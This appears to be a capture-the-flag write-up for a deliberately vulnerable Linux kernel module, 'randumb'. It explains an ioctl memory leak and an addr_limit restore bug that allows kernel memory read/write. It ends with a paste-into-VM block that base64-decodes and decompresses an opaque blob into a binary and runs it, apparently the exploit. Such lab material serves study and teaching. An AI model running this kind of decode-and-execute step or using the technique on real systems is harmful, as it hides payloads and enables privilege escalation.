# randumb writeup

There are two bugs that should pop out:

1. There is a leak when you use the `ioctl` function with `IOCTL_GET_SETTINGS`, uninitialised memory can be exposed.
2. Line 57 of the randumb.c looks like this:
```c
        old_fs = get_fs();
        set_fs(KERNEL_DS);

        file = filp_open(DEBUG_FILE, O_WRONLY|O_CREAT|O_APPEND, 0644);

        if (IS_ERR(file))
                return -EINVAL;
```
If the file cannot be opened, the function `debug_msg` will return before restoring `addr_limit`. So make the file open fail (by exhausting file descriptors or making a folder in `/tmp/randumb.log` etc.) and then you can make pipes to use `read()` and `write()` to read/write kernel memory for example.

### Building
```bash
$ ./build.sh

Paste the following into the VM:
---------- BEGIN COPY ----------
cd /tmp
echo 'QlpoOTFBWSZTWTg8snsAA8d//////v39///8+/9+ev/v/+PsSgx2wHQlF37QacL+/KWV0ASeUPOm6cDbA4MRTVN6p6aJtRppkA09QAB6RoDT1NNAAAANAPUNAAAAAAGgD1NAaAAABqZBTAAjRNTwkzKNqnqbRpqeo9I2mSMGjSA9TynqfqajINADGoDaajDQ1PKB6aENGaRiADCAA0xNGmRhNA0yYJpoaGTBDQaMQYAhoyGTIwQAMgaZMhoYgNGmENANAaZQgijT0QA0NAA0NNDQ0AA0ADQ0DQ0AAANPUD0gAAAABkZPUADFEaRNTanpppMJ6mnoQejUBoYjQPUAZGg0AaAABiGRoaGQAAAA00Gg0A9SzdA8X0SEAE5zAQ1QBJZTfsD1rl+F6s9WUEKmizyn41s6JYaCu0b4kEgoUdJFqXrNxIEeqqaCRT3cBrXp5sxAFsJg8kaeaAgM/M46LVEtNtSuk0yhW0fahENuuTqdStgxdKNE4jMNWJh66dsZsyj4k+8v+r2IJ/o/EkV0WnAIAjIkBIUSDESYUxhFwhSPsBnYTBkkIaD4XyWG55phKBFqAT7CRq7Kv20x7cV/AVtQ3kQk81S6uNYMj1biMbsoTggniAcqn0IaNiTaBIotaACkJIQfWbfJmhoDkJKLFvVqkCYaAipgSfQDAIiA0ysqKiOAgRy+VKJXwXSgOYiIYqks0nSGzpLW2D7nEkZwuBv3NOMKZJJxZwNZZUtVdaYz7vJdDaRTTHXwMsKEkBFQaSxKrTwW2yJLY/hKr26SwMBqzD/Qsvp/jm6tt+cRPB4jqKUokE0DB7PcQQCkxLVNSgzAQBEC0YAiBCqy95JTw9k48J23g9mgiECEySCBYhW9GVzwrB/UXQunAUqBA01Dx7e5zLsO0hNAjgBLzsOCmghUSJDgkQgEH1AB4sicZ2XPyUgPc5GlGajJJKAEoFhJPbkkdHow/c1U6w1IxHh/B4em3wYM1R0xKEhRCUUB'>>ex.b64
echo 'eoCiWF82Za1TABfUrJKMlEQ7IMEAQqHpmucIL6BjmApEJZ/81rSQ/DYZSESXEdapYvCRxs49vMfrAo0FVe1IFBC1GHQgB414bGEFqvynpxZuE3zI3n4jqEDJAYTRc5NX4n4XA41CuMlvBYtwLlqzj/xAoEEGtoaED2lg5XnU9VC/NEYk8Z+QrhFuylpWISUCUhOONMxmhORE6/bptc8Nib10+hEBXtBPEGnpg3LH30ki3wz0SQJGHnl+B3CQsIQQ8IohN9RxisvKyb++spXYPWw9BYwHTGyu/zKleU59q7bGTRDf23Dgu3QuwvoXzlX9ob1uD5dT3JBK8eq5gY+XZAYCqlZSJ9c4n4S2qEtUlMREKBMEGRI2qEKBYzgEC0QQQjBEKlbRgP+FxCAHjmDFIm6FPgNO7eaG3eiQaMg+DpXw9WCbNcYhyPMOAEJUUvXVjetXveVComhixwKblKKBlAkhxtLr7nXVOEz+NQOaAs4kyHRbotBaDW9dNPZ4chCyXDIkUJ7G8igbKUFWnASr9bJ7JoRPZKdDEoOYRD0aNGjCKEonPAoQ6G77BPWJ4EiqJYEqeEqlpUdyiEGIKhqhbKtrThIH3WBVIEibbY/kZml5Wjm+ljenDD4IqRUxr9eVeZlddastYUCbTZVaQ/UgdvEbEPyKFzXbfTFPUREZRoMPwIxVsXYdmjEj7gbefCiWKJSzwQgJjtGYYSkDtQKRwf9sfyoxjIOnEzNOONShDOJ7omRgQkUWkNwWcCYimbSp0+NQksUHGOmZhJEHlIqoyL2aMgOyc+ubyw8VatjLNcK8yTdRYvaKuM6dHBq0jSHTkQmoQLU5FtrJ9K+4AqgS1qV9SiSCwLE19v9DFbkrekSlSqRmGCLOLCVyiFE/n5gfaP3zHrwIOAokp5caJCMztzRVlmtbRrACyw8ASASxJJSBAqqmX+g8G6l38DoGm/FwiBcoNJnTsBMnf6dKqI//F3JFOFCQODyyew=='>>ex.b64
cat ex.b64 | base64 -d | bzip2 -d > ./ex; chmod +x ./ex; ./ex
----------- END COPY -----------
```
